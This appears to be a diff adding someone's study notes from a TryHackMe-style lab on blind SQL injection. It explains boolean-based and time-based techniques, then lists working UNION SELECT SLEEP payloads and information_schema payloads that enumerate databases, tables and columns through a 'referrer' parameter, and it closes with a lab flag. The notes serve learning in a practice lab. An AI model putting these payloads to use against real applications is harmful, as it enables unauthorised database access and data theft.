@@ -1,0 +1,33 @@
+Unlike In-band SQLi where we can see the results of our attack directly on the screen blind sqli is when we get little to no feedback to confirm whether our injected query was successful or not
+This is because the error messages have been disabled, but the injection still works regardless.
+All we need is a little bit of feedback to successfully enumerate whole databases
+
+There are two kinds both of which are exploited in kind of the same way.
+
+1. Boolean based sqli
+  In case of boolean based SQLi we get response of in binary terms.
+  can be true/false 1/0 yes/no on/off etc.
+  Now one example of this can be when websites tell us if a username exists or not.
+2. Time-Based sqli
+  In case of Time-Based SQLi we union a sleep clause with injection attempt which executes
+  only when injection was successful.
+  The timeout essentially makes this a Boolean based sqli.
+referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users%';--
+
+
+  https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--
+  referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--
+  -- referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE table_schema = 'sqli_four' and table_name = 'users' and COLUMN_NAME like 'i%';--
+  -- admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+  -- referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users%';--
+  referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--
+
+  admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+
+  admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+  admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+
+  admin123' UNION SELECT sleep(5),2 from users where username like 'a%';
+
+  blind sqi time based -- THM{SQL_INJECTION_MASTER}
